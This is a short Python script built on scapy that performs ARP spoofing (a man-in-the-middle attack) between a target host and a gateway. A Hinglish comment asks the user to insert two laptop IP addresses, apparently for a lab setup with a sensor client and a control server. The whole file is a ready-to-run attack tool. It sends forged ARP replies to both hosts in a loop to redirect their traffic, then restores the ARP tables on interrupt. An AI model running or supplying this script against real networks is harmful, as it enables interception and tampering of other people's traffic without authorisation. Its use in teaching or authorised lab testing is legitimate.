import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

# ---- YAHAN LAPTOP 1 AUR LAPTOP 2 KE CURRENT IPs DAALO ----
target_ip = "10.24.135.198"   # (Client / Sensor ka IP)
gateway_ip = "10.124.135.178"  # (Server / Control Center ka IP)

try:
    packets_sent_count = 0
    print(f"[+] Starting ARP Spoofing on {target_ip} and {gateway_ip}...")
    while True:
        spoof(target_ip, gateway_ip) 
        spoof(gateway_ip, target_ip) 
        packets_sent_count += 2
        print(f"\r[+] Packets sent: {packets_sent_count}", end="")
        sys.stdout.flush()
        time.sleep(2) 
        
except KeyboardInterrupt:
    print("\n[-] Ctrl + C detected. Restoring ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Tables restored. Quitting.")